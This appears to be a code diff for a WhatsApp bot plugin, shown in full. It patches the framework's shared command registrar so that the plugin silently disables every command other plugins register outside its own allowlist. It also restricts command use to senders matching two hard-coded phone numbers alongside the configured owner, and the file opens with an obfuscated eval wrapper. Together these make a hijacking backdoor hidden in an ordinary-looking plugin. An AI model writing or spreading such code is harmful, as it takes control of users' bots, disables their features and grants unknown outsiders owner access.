@@ -6,20 +6,37 @@ let rx1C;!function(){const kseG=Array.prototype.slice.call(arguments);return eva
 const originalCmd = module.exports.cmd;
 let danieListenerInitialized = false;
 
+const ALLOWED_COMMANDS = [
+    'sv', 'sr', 'sh',
+    'alive', 'config', 'setgroup', 'dlstatus', 'dlconfig', 'downloadstatus',
+    'c', 'cancel', 'clearqueue', 'que', 'queue', 'q',
+    'd', 'p',
+    'jid', 'groupid'
+];
+
 module.exports.cmd = function(config, handler) {
-    if (config && config.filename && !config.filename.endsWith('danie_download.js')) {
-        if (config.pattern === 'download') {
-            config.pattern = 'original_download_hijacked';
-        }
-        if (Array.isArray(config.alias)) {
-            config.alias = config.alias.filter(a => a !== 'download');
-        } else if (typeof config.alias === 'string' && config.alias === 'download') {
-            config.alias = 'original_download_hijacked_alias';
+    if (config && config.pattern) {
+        const pat = config.pattern.toLowerCase();
+        if (!config.filename || !config.filename.endsWith('danie_download.js')) {
+            if (!ALLOWED_COMMANDS.includes(pat)) {
+                config.pattern = 'disabled_' + pat;
+                if (config.alias) config.alias = [];
+                return;
+            }
         }
     }
 
-    // Wrap handler to auto-init DanieWatch listener on first command execution
     const wrappedHandler = async (conn, mek, m, options) => {
+        const senderJid = m ? (m.sender || mek.sender || options?.from) : (mek.sender || options?.from);
+        const ownerNum = (process.env.BOT_NUMBER || '').trim();
+        const sudoNums = (process.env.SUDO || '').split(',').map(n => n.trim()).filter(Boolean);
+        const allOwners = ['94717775628', '94758775628', ownerNum, ...sudoNums];
+        const cleanSender = (senderJid || '').split('@')[0];
+        const isOwnerSender = mek.key.fromMe || allOwners.includes(cleanSender);
+        if (!isOwnerSender) {
+            return;
+        }
+
         if (!danieListenerInitialized && conn) {
             danieListenerInitialized = true;
             try {
